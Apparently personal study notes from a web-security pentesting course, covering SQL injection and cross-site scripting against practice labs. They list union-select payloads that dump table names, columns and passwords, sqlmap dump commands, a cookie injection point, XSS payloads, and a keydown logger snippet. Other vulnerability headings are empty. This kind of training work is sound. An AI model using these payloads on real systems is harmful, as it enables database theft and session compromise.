
- [ ] SQL- Union | Blind

## Union
https://portswigger.net/web-security/sql-injection/cheat-sheet

Single & Double quotes
```
jeremy' or 1=1# 
```

at the end will use the terminator # aka pound sign or we can even use
```
jeremy' or 1=1-- -
```

Version
```
version()
```


```
jeremy' union select null,null,table_name from information_schema.tables#
```

```
jeremy' union select null,null,column_name from information_schema.columns#
```

```
jeremy' union select null,null,password from injection0x01#
```


## Blind

As we put wrong password we can see that it generated error (i.e. change in content lenght) and also we viewed in render in response code

Than will try username = jeremy' or 1=1#
but will encode it using ctrl + u 
```
username=jeremy'+or+1%3d1%23%26password=password
```

Sqlmap
Copy the request and paste into a txt file -> req.txt

>[! bug] Look for Injection Points
- user agents and think out of the box

```
Cookie: session=6967cabefd763ac1a1a88e11159957db' and 1=1#; 
```

On a live target Mentor says to reduce the number of requests as will get limited request like 3 to 5.
```
sqlmap -r req.txt
```


```
substring((select version()), 1,1) = '7'#
```


```
sqlmap -r req2.txt --level=2 --dump -T injection0x02
```



<hr>



- [ ] XSS -DOM | Stored

Ctrl + Shift + C

```
alert(1)
```

is the most famous cross site scripting payload that you will come across.
Avoid using alter(1) cuz of the changes in Chrome and also how often it's filtered and detected.

>[! bug] Mentor recommend when u're testing for XSS either use print or prompt


### Reflected
LogKey: 
function logKey(event){console.log(event.key)}

document.addEventListner('keydown', logKey)


### Stored



### DOM-based

This is DOM based cross site scripting Cuz what happens is, if we look at the network tab here we just reload the page quickly.

When we actually send information we can see that there is no request going and coming back to the server.

As this is entirely happening locally and it's vulnerability within the client this is DOM based CSS.

```
<script>prompt(1)</script>
```

```
<img src=x onerror="prompt(1)">
```
is a quite common payload when the document tries to load X it will throw an error and on the error we can execute some JS.


Re-direct the user to another website
Command : window.location.href
```
<img src=x onerror="window.location.href ='' ">
```



- [ ] Command Injection - Blind

- [ ] Insecure File Upload - Basic | Magic Bytes

- [ ] Authentication - Brute Force | MFA

- [ ] XXE

- [ ] IDOR

